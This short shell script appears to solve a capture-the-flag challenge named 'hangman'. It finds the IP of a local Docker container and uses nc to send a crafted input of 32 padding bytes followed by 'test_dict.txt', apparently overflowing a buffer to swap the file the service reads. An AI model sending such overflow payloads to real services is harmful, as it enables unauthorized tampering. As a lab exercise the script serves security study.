#!/bin/sh

IP=$(docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' hangman)

if [ -z "$IP" ]; then
    echo "The container is probably not running. Run \`docker compose up\` in the challenge folder"
    exit
fi
PORT=10001

python3 -c "print('a'*32+'test_dict.txt\n9\n8\n7')" - | nc $IP $PORT
